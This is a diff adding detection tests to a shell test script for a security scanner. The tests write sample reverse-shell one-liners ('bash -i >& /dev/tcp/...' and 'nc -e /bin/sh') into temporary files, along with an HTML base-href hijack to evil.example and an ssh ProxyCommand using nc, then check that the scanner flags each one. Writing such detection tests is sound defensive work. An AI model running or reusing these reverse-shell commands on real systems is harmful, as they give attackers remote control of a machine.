@@ -834,6 +834,31 @@ printf 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI u@h\n' > "$RC_DIR/authorized_keys"
     || check "f18 FP guard: plain key clean" "0" "1"
 rm -rf "$RC_DIR"
 
+# F19 reverse shell + F20 base-hijack + F18 ssh-config ext
+RS_DIR=$(mktemp -d)
+printf 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n' > "$RS_DIR/r.sh"
+./hlse_core file "$RS_DIR/r.sh" 2>&1 | grep -q "F19" \
+    && check "f19: /dev/tcp reverse shell flagged" "0" "0" \
+    || check "f19: /dev/tcp reverse shell flagged" "0" "1"
+printf 'nc -e /bin/sh 10.0.0.1 4444\n' > "$RS_DIR/n.txt"
+./hlse_core file "$RS_DIR/n.txt" 2>&1 | grep -q "F19" \
+    && check "f19: nc -e flagged" "0" "0" \
+    || check "f19: nc -e flagged" "0" "1"
+printf '<html><head><base href="http://evil.example/"></head></html>' > "$RS_DIR/b.html"
+./hlse_core file "$RS_DIR/b.html" 2>&1 | grep -q "F20" \
+    && check "f20: base href hijack flagged" "0" "0" \
+    || check "f20: base href hijack flagged" "0" "1"
+printf '<html><body>no base</body></html>' > "$RS_DIR/ok.html"
+./hlse_core file "$RS_DIR/ok.html" 2>&1 | grep -q "OK\|Blind spot" \
+    && check "f20 FP guard: plain html clean" "0" "0" \
+    || check "f20 FP guard: plain html clean" "0" "1"
+mkdir -p "$RS_DIR/.ssh"
+printf 'Host *\n  ProxyCommand nc X 22\n' > "$RS_DIR/.ssh/config"
+./hlse_core file "$RS_DIR/.ssh/config" 2>&1 | grep -q "F18" \
+    && check "f18: ssh ProxyCommand flagged" "0" "0" \
+    || check "f18: ssh ProxyCommand flagged" "0" "1"
+rm -rf "$RS_DIR"
+
 # Dockerfile + CI workflow supply-chain (FROM off-registry, curl|sh,
 # uses: mutable ref, pull_request_target) + hex-key/mnemonic secrets
 DC_DIR=$(mktemp -d)
